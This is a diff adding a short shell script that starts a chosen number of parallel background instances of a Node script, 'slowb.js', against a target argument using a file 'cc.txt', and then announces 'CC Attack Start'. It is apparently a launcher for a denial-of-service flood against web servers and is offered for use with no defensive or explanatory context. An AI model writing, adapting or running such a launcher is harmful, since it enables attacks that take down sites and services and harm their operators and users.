@@ -1,0 +1,5 @@
+for i in $(seq $1);
+do
+    node slowb.js $2 cc.txt $3 &
+done
+echo "CC Attack Start "
